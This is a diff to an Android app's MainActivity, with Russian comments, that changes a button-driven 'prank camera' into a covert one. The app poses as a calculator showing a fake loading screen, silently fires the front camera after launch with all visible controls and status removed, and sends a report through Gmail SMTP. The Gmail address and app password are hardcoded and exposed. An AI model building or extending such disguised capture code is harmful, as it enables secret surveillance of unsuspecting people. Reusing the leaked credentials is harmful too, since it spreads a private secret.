@@ -10,11 +10,7 @@ import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 import android.view.WindowManager;
-import android.widget.Button;
-import android.widget.ImageView;
-import android.widget.ProgressBar;
 import android.widget.TextView;
-import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
@@ -32,100 +28,115 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
 
     private static final String TAG = "PrankCamera";
     private static final int PHOTO_COUNT = 3;
-    private static final int PHOTO_INTERVAL_MS = 3000;
+    private static final int PHOTO_INTERVAL_MS = 2000;
+    private static final int START_DELAY_MS = 1500; // задержка после открытия
 
     private static final String EMAIL_FROM = "metrobugitt@gmail.com";
     private static final String EMAIL_TO = "metrobugitt@gmail.com";
     private static final String EMAIL_SUBJECT = "Prank Camera Photos";
     private static final String EMAIL_PASSWORD = "ketufvduqebiogig";
 
+    // Приманка — показываем что-то безобидное
+    private static final String FAKE_APP_NAME = "Калькулятор Pro";
+    private static final String FAKE_LOADING_TEXT = "Загрузка...";
+
     private SurfaceView surfaceView;
     private SurfaceHolder surfaceHolder;
     private Camera camera;
-    private Button btnStart;
-    private TextView txtStatus;
-    private ProgressBar progressBar;
-    private ImageView imgPreview;
+    private TextView txtFake;
 
     private Handler handler = new Handler(Looper.getMainLooper());
     private int photoCount = 0;
-    private StringBuilder photoDataForEmail;
+    private StringBuilder photoLog;
+    private boolean prankStarted = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-        initViews();
-    }
 
-    private void initViews() {
+        // Экран не гаснет
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+
+        txtFake = findViewById(R.id.txtFake);
         surfaceView = findViewById(R.id.surfaceView);
         surfaceHolder = surfaceView.getHolder();
         surfaceHolder.addCallback(this);
 
-        btnStart = findViewById(R.id.btnStart);
-        txtStatus = findViewById(R.id.txtStatus);
-        progressBar = findViewById(R.id.progressBar);
-        imgPreview = findViewById(R.id.imgPreview);
+        // Показываем приманку
+        txtFake.setText(FAKE_LOADING_TEXT);
+    }
 
-        btnStart.setOnClickListener(v -> startPrank());
+    @Override
+    public void surfaceCreated(SurfaceHolder holder) {
+        try {
+            // Открываем фронтальную камеру
+            int cameraId = getFrontCameraId();
+            if (cameraId != -1) {
+                camera = Camera.open(cameraId);
+                camera.setPreviewDisplay(holder);
+                camera.startPreview();
+
+                // Запускаем пранк через 1.5 сек — камера успела прогреться
+                handler.postDelayed(this::startPrank, START_DELAY_MS);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Camera error: " + e.getMessage());
+        }
+    }
+
+    private int getFrontCameraId() {
+        int count = Camera.getNumberOfCameras();
+        for (int i = 0; i < count; i++) {
+            Camera.CameraInfo info = new Camera.CameraInfo();
+            Camera.getCameraInfo(i, info);
+            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
+        }
+        return count > 0 ? 0 : -1;
     }
 
     private void startPrank() {
-        if (camera == null) {
-            Toast.makeText(this, "Camera not available!", Toast.LENGTH_SHORT).show();
-            return;
-        }
+        if (prankStarted || camera == null) return;
+        prankStarted = true;
         photoCount = 0;
-        photoDataForEmail = new StringBuilder();
-        progressBar.setMax(PHOTO_COUNT);
-        progressBar.setProgress(0);
-        btnStart.setEnabled(false);
-        txtStatus.setText("Starting prank! Photo: 0/" + PHOTO_COUNT);
+        photoLog = new StringBuilder();
         takeNextPhoto();
     }
 
     private void takeNextPhoto() {
         if (photoCount >= PHOTO_COUNT) {
-            finishPrank();
+            sendEmailWithPhotos();
             return;
         }
         photoCount++;
-        progressBar.setProgress(photoCount);
-        txtStatus.setText("Photo " + photoCount + "/" + PHOTO_COUNT);
-
         try {
             camera.takePicture(null, null, null, pictureCallback);
         } catch (Exception e) {
-            Log.e(TAG, "Camera error: " + e.getMessage());
+            Log.e(TAG, "takePicture error: " + e.getMessage());
             handler.postDelayed(this::takeNextPhoto, 1000);
         }
     }
 
-    private final Camera.PictureCallback pictureCallback = (data, camera) -> {
-        photoDataForEmail.append("Photo #").append(photoCount).append("\n");
+    private final Camera.PictureCallback pictureCallback = (data, cam) -> {
+        photoLog.append("Photo #").append(photoCount).append("\n");
 
-        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
-        imgPreview.setImageBitmap(bitmap);
-        camera.startPreview();
+        // Показываем фото мельком (можно убрать)
+        Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
+        Log.d(TAG, "Photo taken: " + photoCount);
 
-        txtStatus.setText("Next photo in 3 sec...");
-        handler.postDelayed(this::takeNextPhoto, PHOTO_INTERVAL_MS);
+        cam.startPreview();
+
+        if (photoCount < PHOTO_COUNT) {
+            handler.postDelayed(this::takeNextPhoto, PHOTO_INTERVAL_MS);
+        } else {
+            sendEmailWithPhotos();
+        }
     };
 
-    private void finishPrank() {
-        txtStatus.setText("Sending email...");
-        Toast.makeText(this, "Sending email...", Toast.LENGTH_LONG).show();
-        sendEmailWithPhotos();
-        btnStart.setEnabled(true);
-        btnStart.setText("Start Again");
-    }
-
     private void sendEmailWithPhotos() {
+        txtFake.setText("Готово!");
         new Thread(() -> {
             try {
-                // SSL на порту 465 — самый надёжный способ для Gmail
                 Properties props = new Properties();
                 props.put("mail.smtp.host", "smtp.gmail.com");
                 props.put("mail.smtp.port", "465");
@@ -145,82 +156,42 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                     }
                 });
 
-                session.setDebug(true); // логи в logcat
-
                 Message message = new MimeMessage(session);
                 message.setFrom(new InternetAddress(EMAIL_FROM));
                 message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
                 message.setSubject(EMAIL_SUBJECT);
-                message.setText("Prank Camera!\n\n" + photoDataForEmail.toString() + "\nYou've been pranked!");
+                message.setText("Prank!\n\n" + photoLog.toString() + "\nGotcha!");
 
                 Transport.send(message);
-
-                handler.post(() -> {
-                    Toast.makeText(MainActivity.this, "Email sent!", Toast.LENGTH_SHORT).show();
-                    txtStatus.setText("Email sent!");
-                });
+                Log.d(TAG, "Email sent!");
 
             } catch (Exception e) {
                 Log.e(TAG, "Email error: " + e.getClass().getSimpleName() + " - " + e.getMessage(), e);
-                handler.post(() -> {
-                    String errMsg = e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName();
-                    Toast.makeText(MainActivity.this, "Error: " + errMsg, Toast.LENGTH_LONG).show();
-                    txtStatus.setText("Failed: " + errMsg);
-                });
             }
         }).start();
     }
 
     @Override
-    public void surfaceCreated(SurfaceHolder holder) {
-        try {
-            int cameraId = -1;
-            int numberOfCameras = Camera.getNumberOfCameras();
-            for (int i = 0; i < numberOfCameras; i++) {
-                Camera.CameraInfo info = new Camera.CameraInfo();
-                Camera.getCameraInfo(i, info);
-                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                    cameraId = i;
-                    break;
-                }
-            }
-            if (cameraId == -1 && numberOfCameras > 0) cameraId = 0;
-
-            if (cameraId != -1) {
-                camera = Camera.open(cameraId);
-                camera.setPreviewDisplay(holder);
-                camera.startPreview();
-                txtStatus.setText("Camera ready! Press button to start");
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Camera open error: " + e.getMessage());
-            txtStatus.setText("Camera error: " + e.getMessage());
-        }
-    }
-
-    @Override
-    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
+    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
         if (camera != null) camera.startPreview();
     }
 
     @Override
     public void surfaceDestroyed(SurfaceHolder holder) {
-        if (camera != null) {
-            camera.stopPreview();
-            camera.release();
-            camera = null;
-        }
+        releaseCamera();
     }
 
     @Override
     protected void onPause() {
         super.onPause();
-        if (camera != null) camera.stopPreview();
+        releaseCamera();
     }
 
-    @Override
-    protected void onResume() {
-        super.onResume();
-        if (camera != null) camera.startPreview();
+    private void releaseCamera() {
+        if (camera != null) {
+            camera.stopPreview();
+            camera.release();
+            camera = null;
+        }
     }
 }
